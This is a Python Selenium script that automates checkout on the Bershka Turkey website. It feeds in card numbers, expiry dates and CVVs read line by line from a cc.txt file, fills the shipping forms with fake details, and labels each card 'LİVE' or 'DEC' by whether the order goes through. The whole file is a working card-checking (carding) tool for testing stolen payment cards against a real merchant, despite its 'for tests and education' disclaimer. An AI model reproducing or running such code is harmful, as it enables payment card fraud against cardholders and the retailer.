#writing by aligollez for tests and education , The person who uses it is responsible for everything originating from the program.
#

import os
import random
import re
import string
import sys
from http import client
from time import sleep
from typing import BinaryIO, Text
from colorama import Fore, Back, Style, init
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.support import expected_conditions
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support import select
from selenium.webdriver.support.select import Select
from selenium.webdriver.support.ui import Select
from selenium.webdriver.support.wait import WebDriverWait


def funct():
    #Open cc.txt in the folder where bershka.py is located and add to it 
    # ☑ 54066xxxxxxxx|07|2024|025 <== (The year should be 4 numbers, not 2 numbers. otherwise it will not work correctly )
    # ✖ 54066xxxxxxxx|07|24|025  <== (if you do as in this example you will get wrong result)
    CCList = open(r'/home/kali/Masaüstü/Register User/cc.txt', "r", encoding="utf8").read().splitlines()
    kartlar = []

    for i in CCList:
        bolum = i.split('|')
        kartlar.append((bolum[0], bolum[1], bolum[2], bolum[3]) ,)

    return kartlar


letters = ["a", "b","c", "d","e", "f","g", "h","i", "j","k", "l","m", "n",
           "o", "p","q", "r","s", "t","u", "v","w", "x","y", "z",]
def random_char(char_num):
       return ''.join(random.choice(string.ascii_letters) for _ in range(char_num))

caps = webdriver.DesiredCapabilities.CHROME.copy() 
caps['acceptInsecureCerts'] = True
options = webdriver.ChromeOptions()
options.add_experimental_option("excludeSwitches", ["enable-logging"])
options.add_argument('--silent')
options.add_argument('--lang=tr')
options.add_argument('--disable-gpu')
options.add_argument('--ignore-certificate-errors')
options.add_argument('--no-sandbox')
#options.add_argument('--headless')
#options.add_argument("headless")
driver = webdriver.Chrome(executable_path=r'/home/kali/Masaüstü/Register User/chromedriver', options=options)
driver.set_window_size(360,640)

wait = WebDriverWait(driver, 25, poll_frequency=1)
init(autoreset=True)
while True:

        print('Starting ..')
        driver.delete_all_cookies()
        #Purchased product link here  , change it if the product is out of stock
        driver.get("https://www.bershka.com/tr/8-k%C4%B1l%C4%B1f%C4%B1-c0p103091543.html?colorId=512")
        sleep(2)
        wait.until(EC.presence_of_element_located((By.ID, 'onetrust-close-btn-container'))).click()
        wait.until(
        EC.presence_of_element_located((By.CSS_SELECTOR, '.button-text'))).click()
        sleep(2)
        driver.get("https://www.bershka.com/tr/checkout.html")
        sleep(2)
        wait.until(
             EC.presence_of_element_located((By.XPATH, '//*[@id="shipping-wrapper"]/div[1]/shipping-methods/shipping-method[1]/div/span'))
        ).click()
        driver.find_element_by_css_selector('.ellipsis').click()
        wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, '#store-search'))).send_keys('a')
        sleep(1)
        wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, 'button.inverse:nth-child(2)'))).click()
        wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, 'bsk-store-address.stores-address-container:nth-child(1) > div:nth-child(1)'))).click()
        wait.until(EC.presence_of_element_located((By.XPATH, "/html/body/div[20]/div[1]/div[2]/div[1]/checkout-shipping/div/div[1]/shipping-pickup/div/address-form/form/ng-form/ul/li[1]/div"))).click()
        wait.until(EC.presence_of_element_located((By.XPATH, "/html/body/div[20]/div[1]/div[2]/div[1]/checkout-shipping/div/div[1]/shipping-pickup/div/address-form/form/ng-form/ul/li[1]/div/input"))).send_keys("ahe3eds")
        driver.find_element_by_xpath("/html/body/div[20]/div[1]/div[2]/div[1]/checkout-shipping/div/div[1]/shipping-pickup/div/address-form/form/ng-form/ul/li[2]/div/input").click()
        driver.find_element_by_xpath("/html/body/div[20]/div[1]/div[2]/div[1]/checkout-shipping/div/div[1]/shipping-pickup/div/address-form/form/ng-form/ul/li[2]/div/input").send_keys("limkd3ert")
        driver.find_element_by_name("email").click()
        driver.find_element_by_name("email").send_keys("ka35d32s39et@mail.com")
        driver.find_element_by_xpath("/html/body/div[20]/div[1]/div[2]/div[1]/checkout-shipping/div/div[1]/shipping-pickup/div/address-form/form/ng-form/ul/li[4]/phone-field/ng-form/ul/li[2]/div/input").click()
        driver.find_element_by_xpath("/html/body/div[20]/div[1]/div[2]/div[1]/checkout-shipping/div/div[1]/shipping-pickup/div/address-form/form/ng-form/ul/li[4]/phone-field/ng-form/ul/li[2]/div/input").send_keys("5344443565")
        driver.find_element_by_xpath("//*[@id='summary-wrapper']/div/div[2]/div/div/cta-checkout/div/div/div[2]/div").click()
        sleep(1)
        driver.find_element_by_css_selector("#summary-wrapper > div > div.summary-cta > div > div > cta-checkout > div > div > div.cta-checkout-post > div > button").click()
         
        tikli = False
        kartlar = funct()
        for (cc, mm, yy, cvv) in kartlar:

            if re.findall(r"^4",cc):
                wait.until(EC.presence_of_element_located(((By.CSS_SELECTOR, '.payment-19-info > span:nth-child(1)')))).click()
                print(f'Visa Seçildi ..') 
            
            elif re.findall(r"^5",cc):
                wait.until(EC.presence_of_element_located(((By.CSS_SELECTOR, '.payment-20-info > span:nth-child(1)')))).click()
                print(f'Mastercard Seçildi ..')

            wait.until(
             EC.presence_of_element_located((By.XPATH, '/html/body/div[20]/div[1]/div[2]/div/checkout-payment/div/div/div[1]/form/div[1]/payment-credit-card/ng-form/ul/li[1]/div/input'))
            ).clear()
            wait.until(
             EC.presence_of_element_located((By.XPATH, '/html/body/div[20]/div[1]/div[2]/div/checkout-payment/div/div/div[1]/form/div[1]/payment-credit-card/ng-form/ul/li[1]/div/input'))
            ).send_keys(cc)
            wait.until(
             EC.presence_of_element_located((By.NAME, "month"))
            ).click()
            wait.until(
             EC.presence_of_element_located((By.NAME, "month"))
            ).send_keys(mm)          
            wait.until(
            EC.presence_of_element_located((By.NAME, "year"))
            ).click  
            wait.until(
            EC.presence_of_element_located((By.NAME, "year"))
            ).send_keys(yy)  
            wait.until(
            EC.presence_of_element_located((By.NAME, "cvv2"))
            ).clear()
            wait.until(
            EC.presence_of_element_located((By.NAME, "cvv2"))
            ).send_keys(cvv)
            wait.until(
            EC.presence_of_element_located((By.NAME, "holder"))
            ).clear()
            driver.find_element_by_name("holder").send_keys("alicae ase") 
            try:
                sleep(1)
                dropdown = driver.find_element(By.NAME, "paymentModeId")
            except:continue
            dropdown = driver.find_element(By.NAME, "paymentModeId")
            try:
                dropdown.find_element(By.XPATH, "//option[. = 'Tek Çekim Ödeme']").click()
            except: continue    
            x=driver.find_element_by_name("number").is_displayed()
            if tikli == False:
               driver.find_element_by_name("privacyPolicy").click()
            tikli = True
            driver.find_element_by_css_selector(".ellipsis").click()
            driver.execute_script("window.scrollTo(0,0)")
            sleep(2)            
            hata2 = ('Hata oldu. Lütfen daha sonra tekrar deneyiniz. Problemin devam etmesi durumunda bizimle iletişime geçiniz.')
            hata1 = ('Sipariş tamamlanamadı. İşlem reddedildi. Girdiğiniz bilgileri kontrol edin veya farklı bir ödeme yöntemi deneyin.')
            hata3 = ('Transaction not completed. Enter the expiry date on your card')
            sleep(2)
            if 'Siparişiniz için çok teşekkür ederiz' in driver.page_source:
                print(Fore.GREEN +"LİVE KART NO"," :", cc,"|",mm,"|",yy,"|",cvv,)
                #print(cikti.text) 
            elif 'Sipariş tamamlanamadı. İşlem reddedildi. Girdiğiniz bilgileri kontrol edin veya farklı bir ödeme yöntemi deneyin.' in driver.page_source: 
                print(Fore.RED +"DEC KART"," :", cc,"|",mm,"|",yy,"|",cvv,)
            elif 'Hata oldu. Lütfen daha sonra tekrar deneyiniz. Problemin devam etmesi durumunda bizimle iletişime geçiniz.' in driver.page_source: 
                print(Fore.RED +"PROGRAMI RESTART ET !"," :", cc,"|",mm,"|",yy,"|",cvv,)
            elif 'Transaction not completed. Enter the expiry date on your card' in driver.page_source:
                print(Fore.RED +"DEC KART"," :", cc,"|",mm,"|",yy,"|",cvv,)
            
            sleep(1)
            driver.get("https://www.bershka.com/tr/checkout.html")
            tikli = False
            sleep(1)

